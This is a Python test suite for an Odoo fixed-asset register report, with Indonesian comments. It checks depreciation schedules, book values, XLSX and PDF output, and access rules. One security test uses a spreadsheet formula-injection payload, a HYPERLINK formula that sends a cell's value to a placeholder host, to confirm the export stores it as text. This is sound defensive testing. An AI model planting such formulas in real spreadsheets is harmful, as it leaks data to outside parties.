"""Laporan Daftar Aset (ditulis ulang): XLSX berisi file, nilai buku benar setelah revaluasi / pelepasan sebagian
(perbaikan bug sumber), PDF ter-render (HTML di mode test), akses dibatasi."""

import base64
import io
from datetime import date

from odoo import Command
from odoo.exceptions import AccessError
from odoo.tests import new_test_user, tagged

from .common import EfnAssetCommon

BOOK_COL = 23  # kolom "Nilai Buku" (1-indexed openpyxl): No..Umur(6) + Perolehan + Akum + 12 bulan + YTD + Akum


@tagged("post_install", "-at_install", "efn")
class TestEfnAssetRegister(EfnAssetCommon):
    def _wizard(self, year=2025, states="running"):
        return self.env["efn.account.asset.register.wizard"].create(
            {"year": year, "asset_states": states, "company_ids": [Command.set(self.company.ids)]}
        )

    def _row(self, wizard, asset):
        return next(row for row in wizard._efn_register_data()["rows"] if row["code"] == asset.code)

    def test_schedule_figures(self):
        asset = self._make_asset()
        asset.action_confirm()
        row = self._row(self._wizard(), asset)
        self.assertAlmostEqual(row["acq_value"], 12000.0, places=2)
        self.assertAlmostEqual(row["opening"], 0.0, places=2)
        self.assertAlmostEqual(row["ytd"], 11000.0, places=2)  # Feb..Des
        self.assertAlmostEqual(row["m0"], 0.0, places=2)
        self.assertAlmostEqual(row["m1"], 1000.0, places=2)
        self.assertAlmostEqual(row["book"], 1000.0, places=2)
        row_2026 = self._row(self._wizard(year=2026), asset)
        self.assertAlmostEqual(row_2026["opening"], 11000.0, places=2)
        self.assertAlmostEqual(row_2026["book"], 0.0, places=2)

    def test_book_value_after_revaluation(self):
        asset = self._make_asset()
        asset.action_confirm()
        asset._post_due_depreciation(as_of=date(2025, 4, 5))
        self.env["efn.account.asset.revaluation.wizard"].create(
            {
                "asset_id": asset.id,
                "revaluation_date": date(2025, 4, 30),
                "new_value": 13500.0,
                "new_remaining_life": 6,
                "surplus_account_id": self.surplus_account.id,
                "journal_id": self.journal.id,
            }
        ).action_revalue()
        row = self._row(self._wizard(), asset)
        self.assertAlmostEqual(row["acq_value"], 16500.0, places=2)
        self.assertAlmostEqual(row["ytd"], 16500.0, places=2)
        self.assertAlmostEqual(row["book"], 0.0, places=2)
        # Tahun sebelum revaluasi: nilai bruto tanpa revaluasi (koreksi mundur).
        row_2024 = self._row(self._wizard(year=2024), asset)
        self.assertAlmostEqual(row_2024["acq_value"], 12000.0, places=2)

    def test_book_value_after_partial_retirement_and_xlsx(self):
        asset = self._make_asset(name="Pool laporan", quantity=5.0, acquisition_value=5000.0, useful_life_months=10)
        asset.action_confirm()
        asset._post_due_depreciation(as_of=date(2025, 3, 10))
        self.env["efn.account.asset.partial.disposal.wizard"].create(
            {
                "asset_id": asset.id,
                "quantity": 1.0,
                "disposal_date": date(2025, 3, 31),
                "loss_account_id": self.loss_account.id,
            }
        ).action_retire()
        wizard = self._wizard()
        row = self._row(wizard, asset)
        self.assertAlmostEqual(row["acq_value"], 4000.0, places=2)
        self.assertAlmostEqual(row["ytd"], 4200.0, places=2)  # 2x500 + 8x400
        self.assertAlmostEqual(row["accum_end"], 4000.0, places=2)  # 4200 - 200 dilepas
        self.assertAlmostEqual(row["book"], 0.0, places=2)
        # Nilai model saat ini (2 bulan terposting): 4000 - (1000 - 200) = 3200.
        self.assertAlmostEqual(asset.net_book_value, 3200.0, places=2)

        action = wizard.action_xlsx()
        self.assertEqual(action["type"], "ir.actions.act_url")
        self.assertTrue(wizard.xlsx_file)
        from openpyxl import load_workbook  # noqa: PLC0415 - terpasang di image efn-odoo

        sheet = load_workbook(io.BytesIO(base64.b64decode(wizard.xlsx_file))).active
        values = {
            sheet.cell(row=r, column=2).value: sheet.cell(row=r, column=BOOK_COL).value
            for r in range(5, sheet.max_row + 1)
        }
        self.assertAlmostEqual(values[asset.code], 0.0, places=2)
        self.assertEqual(sheet.cell(row=4, column=BOOK_COL).value, "Nilai Buku")

    def test_disposed_and_merged_assets(self):
        asset = self._make_asset()
        asset.action_confirm()
        asset._post_due_depreciation(as_of=date(2025, 4, 5))
        self.env["efn.account.asset.disposal.wizard"].create(
            {
                "asset_id": asset.id,
                "disposal_date": date(2025, 4, 30),
                "disposal_value": 0.0,
                "loss_account_id": self.loss_account.id,
            }
        ).action_dispose()
        row = self._row(self._wizard(states="all"), asset)
        self.assertAlmostEqual(row["book"], 0.0, places=2)
        self.assertAlmostEqual(row["ytd"], 3000.0, places=2)
        a1 = self._make_asset(name="Gabung 1")
        a2 = self._make_asset(name="Gabung 2")
        a1._merge_assets_into_pool(a2)
        codes = [row["code"] for row in self._wizard(states="all")._efn_register_data()["rows"]]
        self.assertIn(a1.code, codes)
        self.assertNotIn(a2.code, codes)

    def test_sec_g57_03_xlsx_text_never_formula(self):
        payload = '=HYPERLINK("https://x.example/?d="&B5,"Nota")'
        asset = self._make_asset(name=payload)
        asset.action_confirm()
        wizard = self._wizard()
        wizard.action_xlsx()
        from openpyxl import load_workbook  # noqa: PLC0415 - terpasang di image efn-odoo

        sheet = load_workbook(io.BytesIO(base64.b64decode(wizard.xlsx_file))).active
        cell = next(
            sheet.cell(row=r, column=3)
            for r in range(5, sheet.max_row + 1)
            if sheet.cell(row=r, column=2).value == asset.code
        )
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, payload)

    def test_pdf_renders(self):
        asset = self._make_asset()
        asset.action_confirm()
        wizard = self._wizard()
        # CE: report_action mengembalikan wizard layout dokumen bila company belum punya external_report_layout_id.
        self.env.company.external_report_layout_id = self.env.ref("web.external_layout_standard")
        action = wizard.action_pdf()
        self.assertEqual(action["type"], "ir.actions.report")
        html, _fmt = self.env["ir.actions.report"]._render_qweb_html(
            "efn_account_asset.report_efn_asset_register", wizard.ids
        )
        html = html.decode() if isinstance(html, bytes) else str(html)
        self.assertIn(asset.code, html)

    def test_register_access(self):
        plain = new_test_user(
            self.env,
            login="efn_asset_plain",
            groups="base.group_user",
            company_id=self.company.id,
            company_ids=[Command.set(self.company.ids)],
        )
        wizard = self._wizard()
        with self.assertRaises(AccessError):
            wizard.with_user(plain)._efn_register_data()
